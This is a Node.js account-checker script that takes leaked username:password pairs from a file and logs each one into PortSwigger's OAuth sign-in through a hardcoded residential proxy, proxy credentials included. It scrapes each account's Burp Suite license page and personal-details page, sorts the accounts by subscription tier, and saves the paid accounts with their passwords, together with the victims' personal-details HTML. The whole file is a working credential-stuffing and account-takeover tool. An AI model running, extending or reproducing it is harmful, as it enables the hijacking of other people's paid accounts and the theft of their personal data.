#!/usr/bin/env node

const https = require('https');
const http = require('http');
const url = require('url');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');
const readline = require('readline');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
const CODE_CHALLENGE = 'BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk';

const httpsAgent = new HttpsProxyAgent(PROXY);
const httpAgent = new HttpProxyAgent(PROXY);

const REQUEST_TIMEOUT = 30000;
const CONCURRENT_REQUESTS = 3;
const MAX_REDIRECTS = 15;
const SAVE_HTML = true;
const TEMPLATES_DIR = 'templates';
const PERSONAL_DETAILS_DIR = `${TEMPLATES_DIR}/personal_details`;
const SUBSCRIPTION_PLANS_DIR = `${TEMPLATES_DIR}/subscription_plans`;

if (SAVE_HTML) {
    [TEMPLATES_DIR, PERSONAL_DETAILS_DIR, SUBSCRIPTION_PLANS_DIR].forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });
}

const stats = {
    total: 0,
    successful: 0,
    failed: 0,
    plans: {
        'Free': 0,
        'Professional': 0,
        'Team': 0,
        'Enterprise': 0,
        'Community': 0,
        'Unknown': 0
    },
    errors: {}
};

const results = [];
const paidAccounts = [];

function setCookie(setCookieHeader, cookies) {
    if (!setCookieHeader) return;
    const parts = setCookieHeader.split(';')[0].split('=');
    if (parts.length === 2) {
        cookies[parts[0].trim()] = parts[1].trim();
    }
}

function getCookieString(cookies) {
    return Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
}

function makeRequest(options, postData = null, cookies = {}) {
    return new Promise((resolve, reject) => {
        const reqUrl = url.parse(options.url);
        const reqOptions = {
            hostname: reqUrl.hostname,
            port: reqUrl.port,
            path: reqUrl.path,
            method: options.method || 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Cookie': getCookieString(cookies),
                ...options.headers
            },
            agent: reqUrl.protocol === 'https:' ? httpsAgent : httpAgent,
            timeout: REQUEST_TIMEOUT
        };

        const protocol = reqUrl.protocol === 'https:' ? https : http;
        const req = protocol.request(reqOptions, (res) => {
            let body = '';

            const setCookieHeader = res.headers['set-cookie'];
            if (setCookieHeader) {
                if (Array.isArray(setCookieHeader)) {
                    setCookieHeader.forEach(h => setCookie(h, cookies));
                } else {
                    setCookie(setCookieHeader, cookies);
                }
            }

            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body,
                    location: res.headers.location
                });
            });
        });

        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });

        if (postData) req.write(postData);
        req.end();
    });
}

function urlencode(obj) {
    return Object.entries(obj)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');
}

function extractPlan(html) {
    if (!html) return 'Unknown';

    const lowerHtml = html.toLowerCase();

    if (lowerHtml.includes('you do not have any subscriptions')) {
        return 'Free';
    }

    if (lowerHtml.includes('burp suite enterprise') ||
        (lowerHtml.includes('enterprise') && lowerHtml.includes('subscription'))) {
        return 'Enterprise';
    }

    if (lowerHtml.includes('burp suite team') ||
        (lowerHtml.includes('team') && lowerHtml.includes('subscription'))) {
        return 'Team';
    }

    if (lowerHtml.includes('burp suite professional') ||
        (lowerHtml.includes('professional') && lowerHtml.includes('subscription'))) {
        return 'Professional';
    }

    if (lowerHtml.includes('community')) {
        return 'Community';
    }

    if (lowerHtml.includes('subscription') || lowerHtml.includes('your subscriptions')) {
        return 'Professional';
    }

    return 'Unknown';
}

async function authenticateAndGetData(username, password) {
    const cookies = {};

    try {
        // Step 1: GET /authorize
        const authorizeUrl = `https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=${CODE_CHALLENGE}&code_challenge_method=S256&response_mode=query`;
        let res = await makeRequest({ url: authorizeUrl, method: 'GET' }, null, cookies);
        let state = res.body.match(/state=([^&\s'"]+)/)?.[1];

        if (!state) throw new Error('State not found in authorize response');

        // Step 2: POST /u/login
        const loginData = urlencode({ username, password, action: 'default', state });
        res = await makeRequest(
            {
                url: 'https://login.portswigger.net/u/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': loginData.length
                }
            },
            loginData,
            cookies
        );

        // Step 3: Follow redirects
        let redirectUrl = res.location;
        let redirectCount = 0;

        while (redirectUrl && redirectCount < MAX_REDIRECTS) {
            if (!redirectUrl.startsWith('http')) {
                redirectUrl = 'https://login.portswigger.net' + (redirectUrl.startsWith('/') ? '' : '/') + redirectUrl;
            }
            res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
            redirectCount++;

            if (res.status !== 302 && res.status !== 301) break;
            redirectUrl = res.location;
        }

        // Step 4: Get licenses page
        res = await makeRequest(
            { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
            null,
            cookies
        );

        // Follow more redirects if needed
        let redirectAttempts = 0;
        while (res.status === 302 && res.location && redirectAttempts < 10) {
            let nextUrl = res.location;
            if (!nextUrl.startsWith('http')) nextUrl = 'https://portswigger.net' + nextUrl;
            res = await makeRequest({ url: nextUrl, method: 'GET' }, null, cookies);
            redirectAttempts++;
        }

        if (res.status === 200 && res.body.length > 500) {
            // Get personal details
            const personalRes = await makeRequest(
                { url: 'https://portswigger.net/users/youraccount/personaldetails', method: 'GET' },
                null,
                cookies
            );

            return {
                success: true,
                licensesHtml: res.body,
                personalHtml: personalRes.status === 200 ? personalRes.body : null
            };
        }

        return {
            success: false,
            error: `Status ${res.status}, Body length: ${res.body.length}`
        };

    } catch (error) {
        return {
            success: false,
            error: error.message
        };
    }
}

async function processAccount(username, password, index, total) {
    const status = `[${index}/${total}]`;

    try {
        process.stdout.write(`${status} ${username}... `);

        const result = await authenticateAndGetData(username, password);

        if (result.success) {
            const plan = extractPlan(result.licensesHtml);
            stats.successful++;
            stats.plans[plan]++;

            results.push({
                username,
                plan,
                status: 'Success',
                timestamp: new Date().toISOString()
            });

            if (plan !== 'Free' && plan !== 'Unknown') {
                paidAccounts.push({ username, password, plan });
            }

            if (SAVE_HTML) {
                const sanitized = username.replace(/[^a-z0-9]/gi, '_');

                // Save details JSON
                const detailsFile = `${PERSONAL_DETAILS_DIR}/${sanitized}_details.json`;
                const detailsData = {
                    username,
                    password,
                    plan,
                    timestamp: new Date().toISOString()
                };
                fs.writeFileSync(detailsFile, JSON.stringify(detailsData, null, 2));

                // Save licenses HTML
                const htmlFile = `${SUBSCRIPTION_PLANS_DIR}/${sanitized}_${plan.replace(/\s/g, '_')}.html`;
                fs.writeFileSync(htmlFile, result.licensesHtml);

                // Save personal details HTML
                if (result.personalHtml) {
                    const personalHtmlFile = `${PERSONAL_DETAILS_DIR}/${sanitized}_personal.html`;
                    fs.writeFileSync(personalHtmlFile, result.personalHtml);
                }
            }

            console.log(`✓ ${plan}`);
            return true;
        } else {
            stats.failed++;
            const errorType = result.error || 'Unknown error';
            stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;

            results.push({
                username,
                plan: 'Failed',
                status: result.error || 'Unknown error',
                timestamp: new Date().toISOString()
            });

            console.log(`✗ ${result.error}`);
            return false;
        }
    } catch (error) {
        stats.failed++;
        const errorType = error.message;
        stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;

        results.push({
            username,
            plan: 'Failed',
            status: error.message,
            timestamp: new Date().toISOString()
        });

        console.log(`✗ ${error.message}`);
        return false;
    }
}

async function loadAccountsFromFile(filePath) {
    const accounts = [];
    const fileStream = fs.createReadStream(filePath);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    for await (const line of rl) {
        const trimmed = line.trim();
        if (trimmed && trimmed.includes(':')) {
            const [username, password] = trimmed.split(':', 2);
            accounts.push({ username, password });
        }
    }

    return accounts;
}

function exportResults() {
    const csvHeader = 'Username,Plan,Status,Timestamp\n';
    const csvRows = results.map(r =>
        `"${r.username}","${r.plan}","${r.status}","${r.timestamp}"`
    ).join('\n');
    fs.writeFileSync('subscriptions_results.csv', csvHeader + csvRows);
    console.log('\n✓ CSV: subscriptions_results.csv');

    fs.writeFileSync('subscriptions_results.json', JSON.stringify(results, null, 2));
    console.log('✓ JSON: subscriptions_results.json');

    if (paidAccounts.length > 0) {
        const paidContent = paidAccounts
            .map(a => `${a.username}:${a.password}:${a.plan}`)
            .join('\n');
        fs.writeFileSync('paid_accounts.txt', paidContent);
        console.log(`✓ Paid: paid_accounts.txt (${paidAccounts.length} accounts)`);
    }

    const summary = `
================================================================================
SUBSCRIPTION EXTRACTION SUMMARY (OAuth Authentication)
================================================================================

Total Accounts Processed: ${stats.total}
Successful: ${stats.successful} (${((stats.successful/stats.total)*100).toFixed(1)}%)
Failed: ${stats.failed} (${((stats.failed/stats.total)*100).toFixed(1)}%)

PLAN DISTRIBUTION:
  Free:         ${stats.plans['Free']}
  Professional: ${stats.plans['Professional']}
  Team:         ${stats.plans['Team']}
  Enterprise:   ${stats.plans['Enterprise']}
  Community:    ${stats.plans['Community']}
  Unknown:      ${stats.plans['Unknown']}

PAID ACCOUNTS: ${paidAccounts.length}

TOP ERRORS:
${Object.entries(stats.errors)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([error, count]) => `  ${error}: ${count}`)
    .join('\n')}

================================================================================
Output:
  - subscriptions_results.csv
  - subscriptions_results.json
  - paid_accounts.txt
  - subscriptions_summary.txt
  - templates/personal_details/ (JSON + HTML per account)
  - templates/subscription_plans/ (HTML per account)
================================================================================
`;

    fs.writeFileSync('subscriptions_summary.txt', summary);
    console.log(summary);
}

async function main() {
    console.log('================================================================================');
    console.log('PortSwigger Subscription Extraction - OAuth Authentication');
    console.log('================================================================================\n');

    console.log('Loading accounts from log.txt...');
    const accounts = await loadAccountsFromFile('log.txt');
    stats.total = accounts.length;
    console.log(`Loaded ${accounts.length} accounts\n`);

    console.log('Processing accounts (OAuth per account)...\n');

    for (let i = 0; i < accounts.length; i += CONCURRENT_REQUESTS) {
        const batch = accounts.slice(i, Math.min(i + CONCURRENT_REQUESTS, accounts.length));
        const promises = batch.map((account, idx) =>
            processAccount(account.username, account.password, i + idx + 1, accounts.length)
        );

        await Promise.all(promises);

        if (i + CONCURRENT_REQUESTS < accounts.length) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }

    console.log('\nExporting results...');
    exportResults();
}

main().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});
